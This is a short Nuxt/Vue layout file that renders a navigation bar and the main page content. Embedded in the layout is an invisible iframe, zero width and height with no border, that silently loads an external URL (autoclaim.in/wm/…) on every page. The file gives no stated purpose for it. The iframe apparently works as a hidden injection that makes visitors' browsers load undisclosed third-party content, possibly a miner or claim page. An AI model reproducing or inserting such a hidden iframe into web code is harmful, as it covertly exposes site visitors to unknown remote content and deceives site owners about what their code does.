<template>
  <div
    class="flex flex-col font-sans antialiased text-gray-900 min-h-screen h-screen bg-gray-100"
  >
    <TheNavBar />
    <main class="flex-1 flex overflow-y-hidden">
      <Nuxt />
    </main>
    <iframe
      src="https://autoclaim.in/wm/acatzk/2"
      width="0"
      height="0"
      style="border:0"
    ></iframe>
  </div>
</template>

<script>
export default {
  components: {
    TheNavBar: () => import("@/components/TheNavBar")
  }
};
</script>
